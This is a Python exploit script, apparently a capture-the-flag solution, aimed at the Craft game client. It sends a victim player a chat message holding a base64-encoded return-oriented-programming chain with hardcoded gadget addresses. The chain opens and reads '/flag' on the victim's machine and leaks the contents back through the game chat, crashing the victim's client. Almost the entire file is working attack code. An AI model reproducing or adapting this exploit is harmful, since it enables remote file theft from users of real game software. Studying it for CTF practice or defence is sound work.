#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# @Author: impakho
# @Date:   2020/04/14
# @Github: https://github.com/impakho

import requests, time, json
from pwn import *
from base64 import *

# Please modify this config
WEB_PROXY_ADDR = {'http': 'http://127.0.0.1:9090'}
REALWORLD_PROXY_IP = '127.0.0.1'
REALWORLD_PROXY_PORT = 8080
REALWORLD_WEB_ADDR = 'http://172.20.39.31:80'
PLAYER_NAME = 'michaelfogleman.' # length must be 16 bytes, each char locates in `data_access_token_url`
VICTIM_PLAYER = 'bot-abcd1234'


def pow(sess, timeout=False):
    resp = sess.get(REALWORLD_WEB_ADDR + "/pow", proxies=WEB_PROXY_ADDR, timeout=5)
    decoded = json.loads(resp.content)
    text, result = decoded['text'], decoded['hash']

    now_time = time.time()
    table = string.ascii_letters + string.digits
    for c1 in table:
        for c2 in table:
            for c3 in table:
                for c4 in table:
                    full_text = text + c1 + c2 + c3 + c4
                    if hashlib.sha256(full_text.encode()).hexdigest() == result:
                        return full_text
                    if timeout and time.time() - now_time >= 15:
                        return ''
    return ''


sess = requests.session()

print("pow start")
text = pow(sess, False)
print("pow end")

resp = sess.get(REALWORLD_WEB_ADDR + '/deploy', proxies=WEB_PROXY_ADDR, timeout=5, params={'work': text[-4:]})
if 'fail' in resp.text:
    print(resp.text)
    exit()

VICTIM_PLAYER = resp.text.split('"')[1].split('"')[0]
print(resp.text)
print("Wait 15 seconds. VICTIM_PLAYER will join in the game.")

time.sleep(15)

io = remote(REALWORLD_PROXY_IP, REALWORLD_PROXY_PORT)

# Version 1
io.sendline('V,1')

# Authenticate
io.sendline('A,,')

# Talk. Use command '/nick' to set player name
io.sendline('T,/nick %s' % PLAYER_NAME)

# Build Payload

# -- some addresses
func_ret = 0x48C193
pop_rdi = 0x43BBB5
pop_rsi = 0x43CA13
pop_rdx = 0x4835A5
pop_rcx = 0x403E9E
mov_lb_rdi_rb_rax = 0x4C60B9
add_ecx_lb_rdx_rb = 0x4492AD
plt_memcpy = 0x43A680
plt_fopen = 0x43B610
plt_fread = 0x43ACD0
func_client_talk = 0x48D400
rodata_asc = 0x57343F
rodata_asc_str = '@  \x00'
data_access_token_url = 0x7A0980
data_access_token_url_str = 'https://craft.michaelfogleman.com/api/1/identity\x00'
bss_data = 0x7FFF00

payload = b''.ljust(0x18, b'a')

def BuildString(dst, src, dst_str, src_str):
    payload = b''
    for i in range(len(dst_str)):
        if dst_str[i] not in src_str:
            return b''
        pos = src_str.index(dst_str[i])
        payload += p64(pop_rdi) # pop rdi
        payload += p64(dst + i) # dst
        payload += p64(pop_rsi) # pop rsi
        payload += p64(src + pos) # src
        payload += p64(pop_rdx) # pop rdx
        payload += p64(1) # 1
        payload += p64(plt_memcpy)
    return payload

payload += BuildString(bss_data, data_access_token_url, '/flag', data_access_token_url_str)
payload += BuildString(bss_data + 6, data_access_token_url, 'r', data_access_token_url_str)
payload += BuildString(bss_data + 8, rodata_asc, '@', rodata_asc_str)

# -- Build String PLAYER_NAME = 'michaelfogleman.'
payload += p64(pop_rdi) # pop rdi
payload += p64(bss_data + 9) # dst
payload += p64(pop_rsi) # pop rsi
payload += p64(data_access_token_url + 14) # src
payload += p64(pop_rdx) # pop rdx
payload += p64(16) # 16
payload += p64(plt_memcpy)

payload += BuildString(bss_data + 25, rodata_asc, ' ', rodata_asc_str)

# -- fopen
payload += p64(pop_rdi) # pop rdi
payload += p64(bss_data) # /flag
payload += p64(pop_rsi) # pop rsi
payload += p64(bss_data + 6) # r
payload += p64(plt_fopen)

# -- prepare fread - mov eax to ecx
payload += p64(pop_rdi) # pop rdi
payload += p64(bss_data - 8) # bss_data - 8
payload += p64(mov_lb_rdi_rb_rax) # mov qword ptr [rdi], rax
payload += p64(pop_rdx) # pop rdx
payload += p64(bss_data - 8) # bss_data - 8
payload += p64(pop_rcx) # pop rcx
payload += p64(0x0) # 0x0
payload += p64(add_ecx_lb_rdx_rb) # add ecx, dword ptr [rdx]

# -- fread
payload += p64(pop_rdi) # pop rdi
payload += p64(bss_data + 26) # dst
payload += p64(pop_rsi) # pop rsi
payload += p64(0x1) # 0x1
payload += p64(pop_rdx) # pop rdx
payload += p64(0x80) # 0x80
payload += p64(plt_fread)

# -- client_talk
payload += p64(pop_rdi) # pop rdi
payload += p64(bss_data + 8) # src
payload += p64(func_client_talk)

# -- function_return
payload += p64(func_ret)

payload = base64.b64encode(payload)

# Talk. @VICTIM_PLAYER to Exploit.
# VICTIM_PLAYER's game will crash!
io.sendline('T,@%s %s' % (VICTIM_PLAYER, payload.decode()))

# Receive flag from VICTIM_PLAYER
io.interactive()